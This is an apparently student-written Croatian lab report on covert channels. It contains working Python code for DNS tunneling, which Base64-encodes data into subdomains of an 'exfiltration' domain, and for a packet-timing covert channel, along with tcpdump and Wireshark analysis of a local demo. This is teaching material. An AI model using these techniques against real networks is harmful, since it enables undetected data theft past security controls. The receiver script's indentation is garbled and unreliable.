# 1. Uvod









# 2. DNS Tunneling - Donat Ricov

Domain Name System protokol, poznat i kao DNS protokol, obuhvaća tehniku za prijenos podataka koji protokolu nisu izvorno namjenjeni. Iako je DNS koristan za prevođenje naziva domena u IP adrese te je kao takav osnovni protokol intereta, ovakva priroda samog protokola čine ga idealnim medijem za zaobilaženje standardnih sigurnosnih politika i stvaranje skirvenih komunikacijskih kanala. To znači da osim što DNS zbog svoje široke primjene može biti korišten u legitimate svrhe, također može biti zlouporabljen u kontekstu kibernetičkih napada kako bi se izvršila neželjena eksfiltracija podataka.

Tipičan primjer zlouporabe DNS protokola obuhvaća scenarij u kojem napadač enkapsulira podatke unutar DNS upita i njegovog odgovora. Ovi podaci mogu obihvaćati bezazlen internet promet i standardne komande, ali može se raditi o povjerljivim sigurnosim podacima. Budući da većina mreža dopušta DNS promet zbog njegove prethodno spomenute široke uporabe, potencijalna zlouporaba često može proći nefiltrirana u odnosu na druge vrste prometa. Potencijalno opasan mrežni promet tako često može zaobići vatrozide i probijati sigurnosne sustave u potpunosti neopaženo. Rezultat ovog je stvoren tunel između kompromitiranog sustava i udaljenog poslužitelja napadača.

Mehanizam rada DNS tunnelinga obično uključuje nekoliko komponenti:

1. Klijent na kompromitiranom uređaju - dio malicioznog softvera koji kodira podatke u oblik prikladan za DNS upite.

2. DNS poslužitelj kontroliran od napadača - konfiguriran za obradu neuobičajenih DNS upita i dekodiranje sadržaja unutar njih.

3. Tunneling protokol - definira način pretvaranja podataka u DNS pakete te njihovu rekonstrukciju na odredištu.

Ovakva struktura, zajedno sa standardizacijom samog DNS-a, su razlog njegove učinkovitosti. DNS nazivi domena imaju definiranu strukturu prema kojoj isti mogu sadržavati samo relativno duge nizove znakova. Ovakva struktura omogućava napadaču prenošenje osjetljivih kodiranih podataka. Ovako DNS upiti prolaze kroz nekoliko poslužitelja što otežava, ili čak onemogućuje, lociranje stvarnog izvora tunnelinga.

<img width="6056" height="2050" alt="image" src="https://github.com/user-attachments/assets/29ece733-e97f-48fa-b4b3-a22080c25a47" />

<p align="center"><em>Slika 1: Primjer DNS tunnelinga</em></p>

Iako je tehnika široko poznada u području mrežne i kibernetičke sigurnosti kao medij zlouporabe informacija, krađu podataka i održavanje zlonamjernih kanala, DNS tunneling ima raširene legitimne primjene. Pojedini administratori su korisnici ove tehnike jer im dopušta omogućavanje ograničenih mrežnih usluga u ograničenim ili čak zatvorenim okruženjima. Ipak, i u ovakvim okruženjima primjena ovakvog pristupa može sa sobom nositi legitiman rizik koji može komprimirati sigurnosne politike mreže.

Uzevši u obzir eklatantan porast uporabe DNS tunnelinga u malicioznim svrhama, moderni sigurnosni sustavi često provide napredne analize DNS prometa, dok mrežni administratori pomno prate potencijalne anomalije u strukturi samog prometa. 

# 2.1. Plan izrade praktičnog dijela

Praktični dio rada temelji se na izgradnji i simulaciji okruženja u kojem se demonstrira način funkcioniranja DNS tunnelinga. U ovoj fazi simulirano je generiranje, prijenos i presretanje samih podataka koji su skriveni unutar legitimnog DNS promjeta. Na ovaj je način demonstrirano kako se u praksi može izgraditi ovakav tunel kojim se prenose podaci putem standardnih DNS mehanizama. Također, evidentirano je kako ovakva vrsta prometa izgleda kada je promatrana kroz alate za analizu mreže. Ovakva vrsta pristupa pruža jasnu ilustraciju koncepta DNS tunnelinga kao i praktični prikaz realnog scenarija napada. Ovo je ključno za razumjevanje tehničke izvedbe napada i njegovog potencijalnog sigurnosnog značaja za sami sustav.

## 2.2. Metode i tehnike rada

Za postavljanje izoliranog okruženja simulacije korišten je Oracle VirtualBox. Odabrana je ova ruta jer on omogućuje stvaranje virtualnog stroja u kontroliranom i izoliranom okruženju. Ovo je od visoke važnosti budući da je tu simuliran sam napad. Također, na ovaj mi je način omogućeno simuliranje nekoliko uloga u napadu (klijent, napadač i sam DNS poslužitelj). 

Operacijski sustav koji je korišten je Ubuntu/Linux Mint 22. Ovaj OS je odabran zbog stabilnosti, jednostavnosti konfiguracije mrežnih servisa i dostupnosti potrebnih alata.

Za nadzor i analizu mrežnog prometa koriste se alati:

- Wireshark - za detaljnu grafičku analizu paketa, dekodiranje DNS upita i odgovora te praćenje anomalija u prometu.

- tcpdump - za tekstualno praćenje prometa u stvarnom vremenu, posebno korisno za verifikaciju da se tunelirani sadržaj doista pojavljuje unutar DNS paketa.

U eksperimentalnoj konfiguraciji lokalna fizička računala služe kao tunnel endpoint, odnosno krajnja točka napadačkog kanala. Uz to se simulira rad lokalnog DNS poslužitelja čija je adresa namjerno postavljena na 127.0.0.1, kako bi sav DNS promet bio preusmjeren na Python skriptu koja oponaša ponašanje DNS servera. Time se osigurava potpuno kontrolirano okruženje za testiranje bez rizika utjecaja na stvarnu mrežnu infrastrukturu.

Klijentski program i simulirani DNS poslužitelj implementirani su u programskom jeziku Python, što omogućuje potpunu fleksibilnost u manipuliranju DNS zaglavljima i generiranju vlastitih DNS paketa. Ovaj pristup omogućuje jasno prikazivanje osnovne ideje tuneliranja - enkapsuliranja proizvoljnih podataka u DNS upit i njihovo naknadno izvlačenje na strani poslužitelja.

Simulacija samog napada provedena je u idućim koracima:

1. Postavljanje lokalne domene

2. Simulacija DNS poslužitelja

3. Konfiguracija klijenta

4. Slanje tuneliranog prometa

5. Nadzor prometa alatima tcpdump i Wireshark

6. Obrada i rekonstrukcija podataka na strani poslužitelja

## 2.3. Praktični dio

U sklopu praktičnog dijela rada implementiran je jednostavan DNS poslužitelj u programskom jeziku Python koji služi za demonstraciju DNS tunnelinga. Poslužitelj obrađuje dolazne DNS zahtjeve, iz imena domene izdvaja skrivenu poruku kodiranu u Base64 formatu te je dekodira na strani napadača. Time se ilustrira kako je moguće prenijeti proizvoljne podatke unutar DNS prometa.

### 2.3.1. Poslužitelj - dns_server.py

Na početku skripte uvoze se potrebni moduli:
```
import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
```
Modul socket služi za rad s UDP socketima i primanje/slanje DNS paketa, base64 omogućuje dekodiranje poruka koje su skrivene u DNS upitima, dok se pomoću biblioteke dnslib pojednostavljuje parsiranje i generiranje DNS zapisa (upita i odgovora).
```
Funkcija extract_message_from_subdomain(subdomain) zadužena je za dekodiranje skrivene poruke:

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"
```
Pretpostavlja se da je tajna poruka kodirana u Base64 formatu i umetnuta u prvi dio domene (poddomenu). Funkcija prima taj niz znakova, pretvara ga u bajtove i potom pokušava dekodirati iz Base64 natrag u čitljiv tekst. U slučaju pogreške (npr. ako niz nije ispravno kodiran), vraća se poruka o grešci. Ovaj korak direktno predstavlja “vađenje” tuneliranih podataka iz DNS upita.

Ključna logika implementirana je u funkciji process_dns_query(query_data, client_ip):
```
def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(
        DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1),
        q=parsed_query.q
    )
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")
```
Primljeni DNS paket se parsira pomoću DNSRecord.parse, čime se dobiva struktura koja olakšava dohvaćanje traženog imena domene (qname). Na temelju dobivenog upita kreira se početni DNS odgovor (response_record), pri čemu se zadržava isti identifikator (id) kako bi klijent prepoznao odgovor kao pripadajući odgovarajućem upitu.

Sljedeći dio funkcije provjerava radi li se o domeni koja se koristi za tuneliranje:
```
    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")

    return response_record.pack()
```
Domena “dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.

Neovisno o sadržaju poruke, DNS poslužitelj vraća legitiman odgovor klijentu: dodaje A zapis koji traženu domenu mapira na IP adresu 127.0.0.1. Na taj način DNS odgovor izgleda uobičajeno, a tuneliranje ostaje skriveno unutar same strukture upita.

Ako zahtjev nije usmjeren na domenu dataexfiltration.hr, poslužitelj ga označava kao nevažeći za potrebe tuneliranja, ali ga i dalje može obraditi ili ignorirati, ovisno o daljnjoj implementaciji.

Funkcija run_dns_server implementira samu DNS uslugu koja neprekidno sluša na odabranom portu:
```
def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")
```
Poslužitelj koristi UDP socket jer DNS standardno radi preko UDP-a. Socket se veže na zadanu IP adresu i port (u ovom slučaju 5354), zatim u beskonačnoj petlji (while True) prima DNS upite do veličine 512 bajtova (standardna veličina DNS paketa). Svaki primljeni upit prosljeđuje se funkciji process_dns_query, a dobiveni odgovor ponovno se šalje klijentu na istu adresu. Ugrađena je osnovna obrada grešaka kako bi se spriječio prestanak rada poslužitelja zbog iznimki.

Na kraju se skripta pokreće standardnim Python obrascem:
```
if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")
```
Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izravno, dok se logika može ponovno koristiti i kao modul u drugim programima.

## 2.3.2. Klijent - client.py

Klijentska skripta implementirana u Pythonu zadužena je za generiranje DNS upita koji sadrže skrivenu (tuneliranu) poruku te njihovo slanje prema simuliranom DNS poslužitelju. Skripta koristi biblioteku dnspython, koja omogućuje jednostavno kreiranje i slanje DNS upita, dok se za skrivanje podataka koristi Base64 kodiranje. Ovakav pristup vjerno simulira tipičnu tehniku eksfiltracije podataka putem DNS protokola.

Na početku skripte nalaze se uvozi potrebnih modula:
```
import dns.message
import dns.query
import base64
```
Modul dns.message omogućuje stvaranje DNS upita, dns.query upravlja slanjem upita putem UDP protokola, a base64 se koristi za kodiranje tajnih podataka u oblik pogodan za umetanje u ime domene.

Funkcija encode_data_in_subdomain(data, domain) pretvara proizvoljnu poruku u Base64 format i umetne je kao poddomenu ispred napadačeve domene:
```
def encode_data_in_subdomain(data, domain):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return f"{encoded}.{domain}"
```

Poruka (data) se pretvara u bajtove i kodira Base64 algoritmom. Dobiveni Base64 niz se spaja s domenom napadača, pri čemu se formira DNS ime oblika “kodiranaPoruka.dataexfiltration.hr”

Ovaj pristup omogućuje skrivanje tajnih podataka unutar DNS upita jer svaki segment domene smije sadržavati alfanumeričke znakove i određene simbole — što Base64 ispunjava.

Glavna funkcija transmit_dns_tunnel_message zadužena je za sastavljanje DNS upita, enkapsulaciju poruke te slanje upita prema ciljnom DNS poslužitelju:
```
def transmit_dns_tunnel_message(server, domain, message, port=53):
    query_domain = encode_data_in_subdomain(message, domain)
    query = dns.message.make_query(query_domain, dns.rdatatype.A)
    try:
        response = dns.query.udp(query, server, port=port)
        print(f"Message sent: '{message}' as '{query_domain}'")
        print(f"Response:\n{response}")
    except Exception as e:
        print(f"Transmission failed: {e}")
```
Ova funkcija radi nekoliko ključnih koraka:

Skrivanje poruke

Stvaranje DNS upita - pomoću dns.message.make_query kreira se standardni DNS A upit za domenu koja u sebi nosi skrivenu poruku.

Slanje upita UDP-om - dns.query.udp šalje DNS upit na adresu simuliranog poslužitelja.

Ispis rezultata - skripta prikazuje izvorni tekst poruke, njezinu kodiranu verziju te DNS odgovor primljen sa servera.

U slučaju problema (npr. nedostupan server), funkcija hvata iznimku i ispisuje poruku o grešci.

Ovaj mehanizam vjerno predstavlja klijentsku stranu DNS tunnelinga — napadač šalje kriptirane podatke unutar DNS upita, a poslužitelj ih dekodira.

U glavnom dijelu definiraju se parametri tuneliranja i pokreće se funkcija za slanje poruke:
```
if __name__ == "__main__":
    domain = "dataexfiltration.hr"
    server_ip = "127.0.0.1"
    server_port = 5354

    msg = "Ova poruka je tajna."

    transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)
```
domain predstavlja kontroliranu domenu napadača.

server_ip i server_port upućuju na lokalni simulirani DNS poslužitelj implementiran ranije.

msg sadrži podatke koje napadač želi eksfiltrirati.

Poziv transmit_dns_tunnel_message inicira stvarni DNS tunneling.

Ovaj dio skripte služi kao demonstracija kako se jednostavan tekst može “zapakirati“ u DNS upit i poslati, što u praksi predstavlja osnovni mehanizam DNS eksfiltracije podataka.

## 2.4. Slanje poruke i snimanje prometa

U ovom dijelu praktičnog rada provedeno je testiranje implementiranog DNS tunneling sustava. Cilj je bio poslati skrivenu poruku klijentskom skriptom, omogućiti DNS poslužitelju da ju dekodira te usporedno snimiti cjelokupni mrežni promet kako bi se analizirali korišteni DNS paketi. Proces se sastoji od nekoliko koraka: pokretanja alata za snimanje prometa, aktiviranja DNS poslužitelja, slanja tunelirane poruke i konačnog pregleda dobivenih rezultata.

### 2.4.1. Snimanje prometa korištenjem tcpdump alata
Za praćenje mrežnog prometa odlučio sam koristiti alat tcpdump, budući da omogućuje precizno filtriranje paketa i spremanje snimljenog prometa u .pcap format pogodan za naknadnu analizu u Wiresharku. Budući da se DNS poslužitelj izvršava lokalno i sluša na portu 5354, konfigurirano je snimanje tog prometa. Snimanje prometa pokrenuo sam naredbom:
```
sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap
```
Na ovaj je način pokrenuto snimanje svih UDP paketa koji prolaze kroz loopback (lo) sučelje i ciljaju port 5354. Snimanje je uspješno započelo i tcpdump je počeo zapisivati pakete u datoteku dns_tunnel.pcap.

Ovaj korak bio je važan kako bi se kasnije moglo dokazati da se poruka doista prenosi unutar DNS upit

<img width="674" height="53" alt="image" src="https://github.com/user-attachments/assets/68adec33-df9d-417a-9c34-c6cd96bd68a8" />

<p align="center"><em>Slika 2: Pokretanje snimanja mrežnog prometa</em></p>

### 2.4.2. Pokretanje DNS servera

U drugom terminalu pokrenuo sam DNS poslužitelj implementiran u skripti dns_server.py. Prvo sam se navigirao u odgovarajući direktorij:
```
cd dns_tunnel
python3 dns_server.py
```
Nakok pokretanja, ispisala mi se pripadajuća poruka:
```
Starting DNS server on 0.0.0.0:5354
```
Ova poruka potvrđuje da se poslužitelj uspješno pokrenuo, da sluša na svim mrežnim sučeljima te da je spreman primati DNS upite. Poslužitelj se izvršava u kontinuiranoj petlji i obrađuje svaki pristigli DNS paket, uključujući i one koji nose kodirane podatke.
<img width="830" height="84" alt="image" src="https://github.com/user-attachments/assets/63987700-56cc-457f-83bd-92c276547971" />

<p align="center"><em>Slika 3: Pokretanje DNS poslužitelja</em></p>

### 2.4.3. Pokretanje klijenta i slanje poruke

U trećem terminalu pokrenuta je klijentska skripta zadužena za slanje poruke tunelirane unutar DNS upita. Skripta client.py smještena je u istom direktoriju:
```
cd dns_tunnel
python3 client.py
```
Nakon izvršavanja, ispisana je sljedeća poruka:
```
Message sent: 'Ova poruka je tajna.' as
'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
```
Ovaj ispis potvrđuje da je izvorni tekst “Ova poruka je tajna.“ uspješno kodiran u Base64 format i umetnut kao poddomena domene dataexfiltration.hr. Klijent je zatim generirao DNS A-upit prema lokalnom serveru.

Dodatno, prikazan je sadržaj DNS odgovora:
```
;QUESTION
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
;ANSWER
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
```
Ovo pokazuje da je server obradio zahtjev te vratio očekivani odgovor s IP adresom 127.0.0.1, što znači da je čitav tunelirani komunikacijski ciklus uspješno realiziran.

<img width="729" height="238" alt="image" src="https://github.com/user-attachments/assets/1e803ab6-0953-43a0-8d24-d0fcdf73e0a1" />

<p align="center"><em>Slika 4: Uspiješno slanje i odgovor DNS upita</em></p>

### 2.4.4. Čitanje tajne poruke

Na strani poslužitelja vidljivo je kako je server primio zahtjev, prepoznao domenu i dekodirao skrivenu poruku. U terminalu se prikazalo:
```
Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
Decoded secret: Ova poruka je tajna.
Responding with IP: 127.0.0.1
```
Ovaj ispis predstavlja dokaz da je tuneliranje uspješno izvedeno.
DNS poslužitelj izdvojio je Base64 kodirani segment iz imena domene, dekodirao ga i rekonstruirao originalnu tekstualnu poruku.

<img width="819" height="90" alt="image" src="https://github.com/user-attachments/assets/a6b2dc61-b38e-4c94-aeb6-af558db5e994" />

<p align="center"><em>Slika 5: Prikaz dekodirane poruke na serveru</em></p>

### 2.4.5. Zaustavljanje tcpdump-a

Nakon završetka komunikacije, tcpdump proces je zaustavljen pritiskom tipki Ctrl + C. Alat je prikazao statistiku:
```
^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
```
Zabilježena su ukupno dva paketa koji odgovaraju poslanom DNS upitu i dobivenom odgovoru.
Snimljeni promet spremljen je u datoteku dns_tunnel.pcap, koja se može dodatno analizirati u alatu poput Wiresharka za detaljan pregled zaglavlja i sadržaja DNS paketa.

<img width="232" height="67" alt="image" src="https://github.com/user-attachments/assets/ffc478b0-9204-4ccb-a292-85e283a33e76" />

<p align="center"><em>Slika 6: Statistika snimanja</em></p>

### 2.5. Analiza prometa u Wiresharku

Nakon što je mrežni promet snimljen pomoću alata tcpdump, sljedeći je korak bio detaljno analizirati sadržaj paketa korištenjem Wiresharka. Ova analiza omogućuje potvrdu da se tajna poruka doista prenosila unutar DNS upita, kao i uvid u način na koji izgleda tunelirani DNS promet na paketnoj razini.

### 2.5.1. Otvaranje snimljenog prometa u Wiresharku

Prvo sam pokrenuo aplikaciju Wireshark te sam nakon pokretanja otvorio snimljenu datoteku dns_tunnel.pcap. Ovime je učitan sav promet snimljen tijekom slanja tunelirane DNS poruke.

### 2.5.2. Filtriranje DNS paketa

Kako bi se prikazali samo paketi vezani uz DNS komunikaciju, u polje za filtriranje upisao sam dns.

Nakon primjene filtera, u glavnom prozoru prikazani su isključivo DNS paketi, što omogućuje fokusiranu analizu bez šuma iz drugih protokola.

Wireshark je odmah prikazao očekivani DNS upit koji sadrži vrlo dugu poddomenu. Upravo taj produljeni tekst predstavlja Base64 kodiranu poruku umetnutu u DNS QNAME polje.

### 2.5.3. Uvid u sadržaj DNS paketa

Nakon što sam kliknuo na odgovarajući DNS paket, u srednjem panelu Wiresharka otvorila se njegova struktura. Unutar sekcije Domain Name System nalazila se stavka Name, koja je prikazala punu domenu koja je bila predmet DNS upita:
```
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr
```
Ovdje se jasno vidi da je prva komponenta domene dugačak Base64 niz, koji predstavlja kodiranu verziju poruke:

"Ova poruka je tajna."

Ovaj korak potvrđuje da se tuneliranje odvija kroz polje QNAME, koje DNS poslužitelji normalno obrađuju, a sigurnosni sustavi često zanemaruju.

<img width="934" height="579" alt="Snimka zaslona 2025-12-07 201726" src="https://github.com/user-attachments/assets/e02e53b5-b117-447c-8598-87e0c1826854" />

<p align="center"><em>Slika 7: Sadržaj DNS paketa</em></p>

### 2.5.4. Verifikacija kodiranog sadržaja
Iako server u ovom projektu automatski dekodira Base64 niz, u Wireshark analizi moguće je dodatno provjeriti da se u paketu uistinu nalazi poruka koju sam poslao.

Kodirani dio:
```
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=
```
može se po želji ručno dekodirati pomoću online alata ili naredbe:
```bash
echo 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=' | base64 -d
```
Rezultat je:
```
Ova poruka je tajna.
```
Time je potvrđeno da se cijeli sadržaj poruke nalazi u DNS paketu i da je uspješno prenesen sustavom DNS tunnelinga.

Iako ručna dekodacija nije nužna u okviru ovog praktičnog rada, ona dodatno demonstrira način na koji se eksfiltrirani podaci mogu rekonstruirati iz samog prometa bez pomoći servera.

### 2.5.5. Potvrda ispravnosti implementacije

Analiza u Wiresharku potvrdila je sve ključne korake implementacije. Tajna poruka uspješno je kodirana u Base64 format te je kodirana poruka umetnuta je u DNS QNAME polje. Ovime je evidentno da je DNS klijent poslao je tunelirani upit, a DNS poslužitelj primio je upit i dekodirao poruku. Uz to, mrežni promet sadrži sve elemente potrebne za rekonstrukciju poruke

Ovaj dio analize pokazuje da je implementirana metoda DNS tunnelinga funkcionalna i da se eksfiltracija podataka može izvesti koristeći standardni DNS protokol bez potrebe za dodatnim kanalima komunikacije.








































# 3. Steganografija - Lana Maček

# 4. Covert timing channels - Marin Vabec

Prikriveni vremenski kanali (eng. covert timing channels, dalje CTC) su tip prikrivenih kanala za slanje informacija koristeći postojeće resurse sustava koji originalno nisu namijenjeni tome te se često koriste kako bi se zaobišli sigurnosni protokoli.
Kroz CTC se podaci šalju tako da se manipulira intervalima izvođenja nekih vremenski specifičnih događaja, npr. stizanje paketa. Za primjer, neki podatak ili informacija se može prvo šifrirati u binarni kod, te se svaki bit nalazi u vremenskom razmaku slanja 2 paketa. U tom primjeru, kraće slanje paketa može simbolizirati binarnu nulu, dok dulje slanje paketa simbolizira binarnu jedinicu. Primatelj šifriranog koda mora samo promatrati i bilježiti vremena dostavljenih paketa i zatim dešifrirati binarni kod u ASCII ili koji drugi početni kod.
 S obzirom da CTC-ovi utječu samo na slanje paketa te ne utječu na same pakete, teže ih je zamijetiti provjeravanjem stiglih paketa.
CTC-ovi se dijele na 2 kategorije: aktivni i pasivni. Kod aktivnih CTC-ova, pošiljatelj i primatelj eksplicitno uspostavljaju vezu komunikacije. Kod pasivnih CTC-ova, slanje podataka se oslanja na komunikaciju putem otvorenih kanala.
U ovom projektu, radi se aktivni CTC, gdje pomoću socketa, pošiljatelj i primatelj uspostavljaju vezu, te pošiljatelj šalje šifrirane podatke.

## 4.1. Plan izrade praktičnog dijela
Planirano je izrada dvije skripte koje će simulirati pošiljatelja tajne poruke te primatelja tajne poruke. Koristit će se Linux okruženje te Python programski jezik. U Pythonu, koristit će se programiranje TCP socketa. Slanje paketa će se odvijati na lokalnoj mreži. Cilj je postići konzistentno slanje i dešifriranje poruke putem CTC-a.

## 4.2 Metode i tehnike rada
Za postavljanje virtualnog okruženja korišten je Oracle Virtual Box. Bitno je da je korištena izolirana okolina kako ne bi došlo do vanjskih smetnji te kako bi testiranje prošlo što kvalitetnije. 
Operacijski sustav koji je korišten je Ubuntu/Linux Mint 22. Ovaj OS je odabran zbog stabilnosti, jednostavnosti konfiguracije mrežnih servisa i dostupnosti potrebnih alata.
Za nadzor i analizu mrežnog prometa koriste se alati:

- Wireshark - za detaljnu grafičku analizu paketa, dekodiranje DNS upita i odgovora te praćenje anomalija u prometu.

- tcpdump - za tekstualno praćenje prometa u stvarnom vremenu, posebno korisno za verifikaciju da se tunelirani sadržaj doista pojavljuje unutar DNS paketa.

Programi pošiljatelja i primatelja su izrađeni pomoću jezika Python i TCP socketa.

## 4.3 Praktično dio
Kako bi se simuliralo slanje tajnih podataka manipuliranjem vremena slanja paketa, izrađene su dvije Python skripte.
Skripta sender.py predstavlja pošiljatelja, tj. TCP server, dok skripta receiver.py predstavlja primatelja poruke, tj. TCP klijent.

### 4.3.1 Program pošiljatelja
Prva skripta sender.py, simulira pošiljatelja tajne poruke. Čeka da se neki korisnik spoji na njegovu vezu te mu šalje pakete u vremenskim razmacima koji se mogu očitati i dešifrirati. 
```
import socket
import time
import binascii 
```
Ovaj isječak koda predstavlja biblioteke potrebne da kod radi.
- socket: koristi se za izradu TCP socketa za iščekivanje klijenta i slanje paketa
- time: iz ove biblioteke se koristi sleep() metoda, koja služi da pauzira program na željeno vrijeme
- binascii: iz ove biblioteke se koristi metoda hexlify() koja pretvara podatke u heksadecimalni zapis
```
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", 8080))
```
Ovaj isječak postavlja TCP server na lokalnu adresu na port 8080.
```
covert = "TAJNA PORUKA " + "EOF"
msg = "Obična poruka"
covert_bin = ""
for i in covert:
    covert_bin += bin(int(binascii.hexlify(i.encode()), 16))[2:].zfill(8)
```
Ovaj isječak postavlja tajnu i površnu poruku. Površna poruka je ona koja se šalje normalnim putem, a tajna se šifrira znak po znak. Prvo se znak pretvori u bajtove (i.encode()), te se zatim pretvaraju u heksadecimalni kod te u binarni. Rezultatu se zatim miču prva dva bita ([2:]), te se dopunjuju nule kako bi konačan rezultat imao točno 8 bitova (zfill(8)).
```
s.listen(0)
c,addr = s.accept()
```
Nakon toga se postavlja TCP server koji osluškuje i iščekuje klijenta.
```
n = 0
count = 0
while(count < len(covert_bin)):
    for i in msg:
        c.send(i.encode())
        if (covert_bin[n] == "0"):
            time.sleep(0.025)
        else:
            time.sleep(0.1)
        n = (n + 1) % len(covert_bin)
        count += 1
c.send("EOF".encode())
c.close()
```
Kada se neki klijent spoji, šalje mu se poruka. Tajna poruka se šalje tako da se površna poruka šalje znak po znak, a razmak između poslanih znakova označava jedan bit tajne poruke. Ako je bit nula, razmak između poslanih paketa/znakova je 0.025 sekundi, a dok je bit 1, razmak je 0.1 sekunde. Ako površna poruka dođe do kraja, a šifrirana poruka nije cijela prenesena, tekst površne poruke se ponavlja dok se šifrirana poruka ne prenese cijela. Zadnja poslana poruka je EOF (end of file).

### 4.3.2 Program primatelja
Ova skripta simulira TCP klijenta koji se spaja na server i prima podatke te ih dešifrira.
```
import socket
import sys
import time
```
- socket: implementacija TCP socketa
- sys: metode za ispis podataka
- time: očitavanje vremena dolaska paketa 
```
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8080))
paket = s.recv(4096).decode()
```
Ovdje se primatelj spaja na server/povezuje sa pošiljateljem i prima prvi paket.
```
covert_bin = ""
while (paket.rstrip("\n") != "EOF"):
    sys.stdout.write(paket)
    sys.stdout.flush()
    t0 = time.time()
    paket = s.recv(4096).decode()
    t1 = time.time()
    delta = round(t1 - t0, 3)
    sys.stdout.write("\tTime: \t" + str(delta) + "\n")
    sys.stdout.flush()  
    if (delta >= 0.1):
        covert_bin += "1"
    else:
        covert_bin += "0"
s.close()
```
Ovaj dio koda prima svaki sljedeći paket, te zapisuje poslani binarni kod. Prvo očitava vrijeme prije prvog poslanog bita u t0, zatim kad primi bit očitava vrijeme u t1, te razliku t1-t0 zapisuje u delta, zaokruženo na 3 decimale. S obzirom na to da je najkraće moguće čekanje bita 0.1, ako je čekanje dulje od ili jednako 0.1, označuje se da je taj bit jedinica, a ako je kraće (najčešće 0.25-0.26), bit se zapisuje kao nula.  Očitavanje bitova tajne poruke se ponavlja dok ne stigne paket sa tekstom EOF (end of file.) Kada se očita poruka EOF, zatvara se veza.
```
covert = ""
i = 0
while (i < len(covert_bin)):
    b = covert_bin[i:i+8]
    if(len(b) != 8):
        break
       n = int("0b{}".format(b), 2)
    try:
        print("byte:\t" + str(b))
        print("int conversion: " + str(n))
        print("char conversion:\t" + chr(n) + "\n")
               covert += chr(n)
           except:
        covert += "?"
           i += 8
print("\nCovert message: " + covert)
```
Sa cijelim binarnim kodom zapisanim, program ga zatim dešifrira. Kod prolazi kroz binarni zapis bajt po bajt, tj. po 8 bitova, pretvara te bitove u dekadski zapis koji zatim pretvara u ASCII symbol (chr(n)), te njega dodaje u konačan zapis covert koji se ispisuje.

## 4.4 Slanje poruke i snimanje prometa


# 5. SMTP - Dino Primorac
